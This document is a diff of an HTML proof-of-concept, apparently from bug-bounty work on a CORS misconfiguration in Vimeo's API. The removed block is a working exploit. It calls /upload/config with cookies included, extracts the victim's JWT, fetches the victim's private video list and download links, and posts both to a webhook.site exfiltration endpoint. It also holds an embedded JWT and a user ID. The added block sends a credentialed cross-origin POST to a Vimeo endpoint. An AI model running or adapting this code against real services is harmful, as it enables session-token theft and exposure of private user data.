@@ -1,60 +1,11 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title>Vimeo CORS PoC</title>
-</head>
-<body>
-  <h1>Vimeo CORS Misconfiguration PoC</h1>
-  <pre id="output">Loading...</pre>
-
-  <script>
-    const exfil = "https://webhook.site/YOUR-UUID"; // Replace with your webhook endpoint
-    const attackerJwt = "jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3NTU4Nzk0MjAsInVzZXJfaWQiOjI0NDk0MzYzNSwiYXBwX2lkIjo1ODQ3OSwic2NvcGVzIjoicHVibGljIGludGVyYWN0IHByaXZhdGUgdXBsb2FkIGNyZWF0ZSBlZGl0IGRlbGV0ZSBlbWFpbCBzdGF0cyB2aWRlb19maWxlcyIsInRlYW1fdXNlcl9pZCI6bnVsbCwianRpIjoiYjg2MzE4MmEtZmNmZC00MjA4LTg0ODItNjhkYjkyZjU3OTdkIiwic2giOiI2ZTliNzdkYjdlYzEwNTQ5MjI3ZTJiOWI5OTY2OThjOWMxMTg0MjExMjEzZTliNDMwOGJjMjdiMzg0M2UyNGRkIn0.iPMz_o3bxcNy67nPzRk0BL_wtSnbQDHnTtkrQ4JzazI";  // Replace with a valid JWT from Burp
-
-    // Step 1: Call /upload/config with attacker's known JWT
-    fetch("https://api.vimeo.com/upload/config", {
-      credentials: "include",
-      headers: {
-        "Authorization": attackerJwt
-      }
-    })
-      .then(r => r.json())
-      .then(configData => {
-        document.getElementById("output").innerText = "Stolen /upload/config:\n" + JSON.stringify(configData, null, 2);
-
-        // Exfil stolen config
-        fetch(exfil, {
-          method: "POST",
-          body: JSON.stringify({ stolen_config: configData }),
-          headers: { "Content-Type": "application/json" }
-        });
-
-        // Grab the main JWT from the response
-        const stolenJwt = configData?.api?.jwt;
-        if (!stolenJwt) throw new Error("No JWT found in /upload/config response");
-
-        // Step 2: Use stolen JWT against the sensitive /users/{id}/videos endpoint
-        const videosEndpoint =
-          "https://api.vimeo.com/users/244943635/videos?per_page=10&page=1&sizes=270x152%2C300x169&sort=last_user_action_event_date&filter=nolive&fields=download.codec,download.rendition,download.created_time,download.expires,download.fps,download.height,download.link,download.public_name,download.quality,download.size,download.size_short,download.source_link,download.type,download.video_file_id,download.width,duration,parent_project.uri,parent_project.is_private_to_user,last_user_action_event_date,manage_link,name,pictures.sizes.link,release_time,privacy.view,privacy.download,user.link,user.name,user.pictures,user.upload_quota,user.uri,embed,uri,link,can_move_to_project,review_page.link,metadata.can_be_replaced,metadata.interactions.delete,metadata.interactions.edit,metadata.interactions.invite,metadata.interactions.legal_hold.uri";
-
-        return fetch(videosEndpoint, {
-          headers: { "Authorization": "jwt " + stolenJwt }
-        });
-      })
-      .then(r => r.json())
-      .then(videosData => {
-        document.getElementById("output").innerText += "\n\nVictim's Videos:\n" + JSON.stringify(videosData, null, 2);
-
-        // Exfil victim's video list
-        fetch(exfil, {
-          method: "POST",
-          body: JSON.stringify({ victim_videos: videosData }),
-          headers: { "Content-Type": "application/json" }
-        });
-      })
-      .catch(err => {
-        document.getElementById("output").innerText = "Error: " + err;
-      });
-  </script>
-</body>
-</html>
+<script>
+fetch("https://arclight.vimeo.com/add/player-stats?beacon=1&session-id=xxx", {
+  method: "POST",
+  credentials: "include",
+  headers: { "Content-Type": "application/json" },
+  body: JSON.stringify([{ "autoplay": true, "viewer_id": 244943635 }])
+})
+.then(r => r.text())
+.then(d => alert(d))
+.catch(e => alert("failed: " + e));
+</script>
